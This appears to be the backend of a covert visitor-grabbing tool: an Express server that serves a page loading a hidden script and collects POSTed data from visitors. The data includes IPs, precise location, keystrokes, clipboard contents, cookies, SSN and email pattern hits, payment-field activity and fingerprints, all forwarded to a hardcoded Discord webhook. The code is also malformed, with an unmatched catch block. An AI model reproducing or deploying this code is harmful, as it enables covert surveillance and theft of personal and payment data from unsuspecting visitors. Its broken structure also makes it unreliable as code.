const express = require('express');
const cors = require('cors');
const useragent = require('useragent');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');
const winston = require('winston');
const cookieParser = require('cookie-parser');
const fs = require('fs').promises;
const path = require('path');

const app = express();

// quick logger setup
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'visitor.log' }),
    new winston.transports.Console()
  ]
});

// file for tracking repeat visitors
const visitorsFile = path.join(__dirname, 'visitors.json');

async function grabVisitors() {
  try {
    const stuff = await fs.readFile(visitorsFile, 'utf8');
    return JSON.parse(stuff);
  } catch (oops) {
    if (oops.code === 'ENOENT') {
      return {};
    }
    logger.error(' couldnt load visitors', { err: oops.message });
    return {};
  }
}

async function dumpVisitors(data) {
  try {
    await fs.writeFile(visitorsFile, JSON.stringify(data, null, 2));
  } catch (oops) {
    logger.error('save failed lol', { err: oops.message });
  }
}

// rate limit to avoid spam
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 mins
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});

// cors stuff, only allow these origins
app.use(cors({
  origin: (origin, cb) => {
    const okOrigins = [
      'http://localhost:3000',
      'https://random-nfpf.onrender.com',
      'https://vanprojects.netlify.app',
      'https://artifacts.grokusercontent.com'
    ];
    if (!origin || okOrigins.includes(origin)) {
      cb(null, origin || '*');
    } else {
      logger.warn('bad cors try', { origin });
      cb(new Error('cors no'));
    }
  },
  credentials: true
}));

app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));
app.use(limiter);

// just make a session id each time
app.use((req, res, next) => {
  req.sessionId = uuidv4();
  logger.info('new session id', { id: req.sessionId });
  next();
});

// main page
app.get('/index.html', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Visitor Tracking</title>
    </head>
    <body>
      <h1>Welcome</h1>
      <script src="/_z113.js"></script>
    </body>
    </html>
  `);
});

app.get('/', (req, res) => {
  res.send('what are you doing here?');
});

// pull ips from headers
function pullClientIp(req) {
  const ipsSet = new Set();

  const headersToCheck = [
    'x-forwarded-for',
    'cf-connecting-ip',
    'true-client-ip',
    'x-real-ip',
    'x-client-ip',
    'forwarded',
    'x-cluster-client-ip',
    'fastly-client-ip',
    'x-original-forwarded-for'
  ];

  for (const hdr of headersToCheck) {
    const val = req.headers[hdr];
    if (val) {
      let ips = [];
      if (hdr === 'forwarded') {
        const parts = val.split(',').map(p => p.match(/for=([^;,\s]+)/i)?.[1]?.replace(/[\[\]"]/g, '').trim());
        ips = parts.filter(ip => ip && checkIp(ip));
      } else {
        ips = val.split(',').map(ip => ip.trim()).filter(ip => checkIp(ip));
      }
      ips.forEach(ip => ipsSet.add(ip));
    }
  }

  const sockIp = req.socket.remoteAddress?.replace(/^::ffff:/, '');
  if (checkIp(sockIp)) {
    ipsSet.add(sockIp);
  }

  const allIps = Array.from(ipsSet);
  const mainOne = allIps[0] || '127.0.0.1';

  logger.info('got ips', { main: mainOne, all: allIps });

  return { primary: mainOne, all: allIps };
}

// ip validator
function checkIp(ip) {
  if (!ip) return false;

  const v4Pat = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  if (v4Pat.test(ip)) return true;

  // ipv6 pattern, long but whatever
  const v6Pat = /^([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)$/;
  return v6Pat.test(ip);
}

// figure out where they came from
function figureReferrer(req) {
  let clientRef = req.body.part1?.referrer || 'Direct';
  const servRef = req.headers['referer'] || 'Direct';
  if (clientRef !== 'Direct' && clientRef !== 'Unknown (Invalid Referrer)') {
    return clientRef;
  }
  if (servRef !== 'Direct') {
    try {
      const u = new URL(servRef);
      const host = u.hostname.toLowerCase();
      if (host.includes('facebook.com')) return 'Facebook';
      if (host.includes('discord.com')) return 'Discord';
      if (host.includes('youtube.com')) return 'YouTube';
      if (host.includes('t.co')) return 'Twitter';
      if (host.includes('reddit.com')) return 'Reddit';
      if (host.includes('tiktok.com')) return 'TikTok';
      if (host.includes('instagram.com')) return 'Instagram';
      return servRef;
    } catch (e) {
      return 'Unknown (Invalid Server Referrer)';
    }
  }
  return 'Direct';
}

// the visit endpoint
app.post('/api/visit', async (req, res) => {
  console.log('got a visit post'); // debug
  logger.info('visit req', {
    hdrs: req.headers,
    cks: req.cookies,
    bod: req.body
  });
  const ipStuff = pullClientIp(req);
  const mainIp = ipStuff.primary;

  const geoRes = await fetch(`http://ip-api.com/json/${mainIp}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,mobile,proxy,hosting`);
  const geo = await geoRes.json();

  if (geo.status === 'fail') {
    logger.error('geo fail', { msg: geo.message, ip: mainIp });
    return res.status(400).send('bad ip');
  }

  const ua = useragent.parse(req.headers['user-agent']);
  const ref = figureReferrer(req);

  let plugs = req.body.part3?.plugins ? Array.isArray(req.body.part3.plugins) ? req.body.part3.plugins : [] : [];
  let mimes = req.body.part3?.mimeTypes ? Array.isArray(req.body.part3.mimeTypes) ? req.body.part3.mimeTypes : [] : [];

  let vid = req.cookies.visitorId;
  if (!vid) {
    vid = uuidv4();
    res.cookie('visitorId', vid, {
      maxAge: 365 * 24 * 60 * 60 * 1000, // year
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: process.env.NODE_ENV === 'production' ? 'None' : 'Lax'
    });
  }

  const visits = await grabVisitors();
  let vdata = visits[vid] || { count: 0, last: null };
  const now = new Date().toISOString();
  const prev = vdata.last || 'First time';
  const cnt = vdata.count + 1;
  vdata = { count: cnt, last: now };
  visits[vid] = vdata;
  await dumpVisitors(visits);

  // big info obj
  const info = {
    vid: vid,
    cnt: cnt,
    prev: prev,
    sid: req.sessionId,
    ip: geo.query,
    allips: ipStuff.all,
    country: geo.country,
    reg: geo.regionName,
    city: geo.city,
    zip: geo.zip,
    lat: geo.lat,
    lon: geo.lon,
    isp: geo.isp,
    org: geo.org,
    as: geo.as,
    mob: geo.mobile,
    prox: geo.proxy,
    host: geo.hosting,
    dev: req.body.part1?.device || '??',
    ts: req.body.part1?.timestamp || now,
    brow: ua.toAgent(),
    os: ua.os.toString(),
    dtype: ua.device.toString(),
    ref: ref,
    lang: req.headers['accept-language'] || '??',
    accept: req.headers['accept'] || '??',
    conn: req.headers['connection'] || '??',
    meth: req.method,
    path: req.originalUrl,
    uaraw: req.headers['user-agent'],
    screen: req.body.part1?.screenSize || '??',
    coldep: req.body.part3?.colorDepth || '??',
    tz: req.body.part3?.timezone || '??',
    lng: req.body.part3?.language || '??',
    hconc: req.body.part3?.hardwareConcurrency || '??',
    dmem: req.body.part3?.deviceMemory || '??',
    dnt: req.body.part3?.doNotTrack || '??',
    plugs: plugs,
    mimes: mimes,
    inlines: req.body.part4?.inlineScripts || [],
    ckacc: req.body.part4?.cookieAccess || false,
    tpreqs: req.body.part4?.thirdPartyRequests || [],
    pmcalls: req.body.part4?.postMessageCalls || [],
    touch: req.body.part3?.touchSupport || '??',
    batt: req.body.part3?.batteryStatus || '??',
    curl: req.body.part1?.currentUrl || '??',
    scroll: req.body.part3?.scrollPosition || '??',
    cks: JSON.stringify(req.cookies) || '{}',
    loc: req.body.part1?.location || '??',
    p3: {
      keys: req.body.part3?.keystrokes || 'none',
      mousef: req.body.part3?.mouseMovementFrequency || '??',
      wgl: req.body.part3?.webglSupport || '??',
      connt: req.body.part3?.connectionType || '??',
      clip: req.body.part3?.clipboardAccess || 'none',
      orient: req.body.part3?.deviceOrientationSupport || '??',
      sessstor: req.body.part3?.sessionStorageUsage || '??',
      feats: req.body.part3?.browserFeatures || 'none',
      loadt: req.body.part3?.pageLoadTime || '??',
      inter: req.body.part3?.userInteractionCount || 0,
      ssnpat: req.body.part3?.ssnPatternDetected || 'none',
      emailpat: req.body.part3?.emailPatternDetected || 'none',
      payint: req.body.part3?.paymentFieldInteraction || 'none',
      utms: req.body.part3?.utmParameters || '{}',
      clicks: req.body.part3?.clickedElements || 'none',
      sessdur: req.body.part3?.sessionDuration || '??',
      evlog: req.body.part3?.eventLog || 'none'
    },
    p4: {
      clcks: req.body.part4?.clientCookies || 'none',
      locstor: req.body.part4?.localStorageUsage || '??',
      locip: req.body.part4?.localIP || '??',
      audfp: req.body.part4?.audioFingerprint || 'none'
    }
  };

  logger.info('visitor data', info);

  const hook = 'https://ptb.discord.com/api/webhooks/1423009299826868396/7ezGh2CAQRooHIvE5sXCBGW0AAgFE2Ku8aFqUDe2eqC2BG7quehvy6JBgWqSwfhrROAq';

  // fields for discord
  const flds = [
    { name: 'Visitor ID', value: info.vid, inline: true },
    { name: 'Visit Count', value: info.cnt.toString(), inline: true },
    { name: 'Last Visit', value: info.prev, inline: true },
    { name: 'Session ID', value: info.sid, inline: true },
    { name: 'IP', value: info.ip, inline: true },
    { name: 'All IPs', value: info.allips.join(', ') || 'n/a', inline: true },
    { name: 'Device', value: info.dev, inline: true },
    { name: 'Referer', value: info.ref, inline: true },
    { name: 'Current URL', value: info.curl, inline: true },
    { name: 'Timestamp', value: info.ts, inline: true },
    { name: 'Country', value: info.country, inline: true },
    { name: 'City', value: info.city, inline: true },
    { name: 'Coordinates', value: `(${info.lat}, ${info.lon})`, inline: true },
    { name: 'Device Location', value: info.loc !== 'Unknown' ? `(${info.loc.latitude}, ${info.loc.longitude}, Acc: ${info.loc.accuracy}m)` : info.loc, inline: true },
    { name: 'ISP', value: info.isp, inline: true },
    { name: 'Mobile', value: info.mob ? 'Yes' : 'No', inline: true },
    { name: 'Proxy', value: info.prox ? 'Yes' : 'No', inline: true },
    { name: 'Hosting', value: info.host ? 'Yes' : 'No', inline: true },
    { name: 'Browser', value: info.brow, inline: true },
    { name: 'OS', value: info.os, inline: true },
    { name: 'Device Type', value: info.dtype, inline: true },
    { name: 'Screen Size', value: info.screen, inline: true },
    { name: 'Timezone', value: info.tz, inline: true },
    { name: 'Language', value: info.lng, inline: true },
    { name: 'Accept Language', value: info.lang, inline: true },
    { name: 'Touch Support', value: info.touch, inline: true },
    { name: 'Battery Status', value: info.batt, inline: true },
    { name: 'Color Depth', value: info.coldep, inline: true },
    { name: 'Hardware Concurrency', value: info.hconc, inline: true },
    { name: 'Device Memory', value: info.dmem, inline: true },
    { name: 'Do Not Track', value: info.dnt, inline: true },
    { name: 'Connection', value: info.conn, inline: true },
    { name: 'Scroll Position', value: info.scroll, inline: true },
    { name: 'Cookies (Server)', value: info.cks, inline: true },
    { name: 'Keystrokes', value: info.p3.keys, inline: true },
    { name: 'Mouse Frequency', value: info.p3.mousef, inline: true },
    { name: 'WebGL Support', value: info.p3.wgl, inline: true },
    { name: 'Connection Type', value: info.p3.connt, inline: true },
    { name: 'Clipboard Access', value: info.p3.clip, inline: true },
    { name: 'Device Orientation', value: info.p3.orient, inline: true },
    { name: 'Session Storage', value: info.p3.sessstor, inline: true },
    { name: 'Browser Features', value: info.p3.feats, inline: true },
    { name: 'Page Load Time', value: info.p3.loadt, inline: true },
    { name: 'Interaction Count', value: info.p3.inter.toString(), inline: true },
    { name: 'SSN Pattern', value: info.p3.ssnpat, inline: true },
    { name: 'Email Pattern', value: info.p3.emailpat, inline: true },
    { name: 'Payment Interaction', value: info.p3.payint, inline: true },
    { name: 'UTM Parameters', value: info.p3.utms, inline: true },
    { name: 'Clicked Elements', value: info.p3.clicks, inline: true },
    { name: 'Session Duration', value: info.p3.sessdur, inline: true },
    { name: 'Event Log', value: info.p3.evlog, inline: true },
    { name: 'Client Cookies', value: info.p4.clcks, inline: true },
    { name: 'Local Storage Usage', value: info.p4.locstor, inline: true },
    { name: 'Local IP', value: info.p4.locip, inline: true },
    { name: 'Audio Fingerprint', value: info.p4.audfp, inline: true }
  ];

  const p1f = flds.slice(0, 18);
  const p2f = flds.slice(18, 33);
  const p3f = flds.slice(33, 48);
  const p4f = flds.slice(48);

  const pay1 = {
    embeds: [{
      title: 'New Visitor! (Part 1 - Basics)',
      color: 0x3498db,
      timestamp: info.ts,
      fields: p1f
    }]
  };

  const pay2 = {
    embeds: [{
      title: 'New Visitor! (Part 2 - Device Stuff)',
      color: 0x2ecc71,
      timestamp: info.ts,
      fields: p2f
    }]
  };

  const pay3 = {
    embeds: [{
      title: 'New Visitor! (Part 3 - User Actions)',
      color: 0xf1c40f,
      timestamp: info.ts,
      fields: p3f
    }]
  };

  const pay4 = {
    embeds: [{
      title: 'New Visitor! (Part 4 - Prints)',
      color: 0xe74c3c,
      timestamp: info.ts,
      fields: p4f
    }]
  };

  // send to discord with delays
  await fetch(hook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(pay1)
  }).then(resp => {
    if (!resp.ok) logger.error('part1 send fail');
    else logger.info('part1 sent');
  });

  await new Promise(r => setTimeout(r, 2000));

  await fetch(hook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(pay2)
  }).then(resp => {
    if (!resp.ok) logger.error('part2 send fail');
    else logger.info('part2 sent');
  });

  await new Promise(r => setTimeout(r, 2000));

  await fetch(hook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(pay3)
  }).then(resp => {
    if (!resp.ok) logger.error('part3 send fail');
    else logger.info('part3 sent');
  });

  await new Promise(r => setTimeout(r, 2000));

  await fetch(hook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(pay4)
  }).then(resp => {
    if (!resp.ok) logger.error('part4 send fail');
    else logger.info('part4 sent');
  });

  res.status(200).send('got it');
  } catch (err) {
    logger.error('visit error', { msg: err.message, stk: err.stack, bod: req.body });
    res.status(500).send('oops');
  }
});

// log incoming
app.use((req, res, next) => {
  logger.info('req in', {
    meth: req.method,
    pth: req.originalUrl,
    ip: pullClientIp(req).primary,
    ts: new Date().toISOString()
  });
  next();
});

// error catcher
app.use((err, req, res, next) => {
  logger.error('error', { msg: err.message, stk: err.stack });
  res.status(500).send('broke');
});

const port = process.env.PORT || 10000;
app.listen(port, () => logger.info(`up on ${port}`));
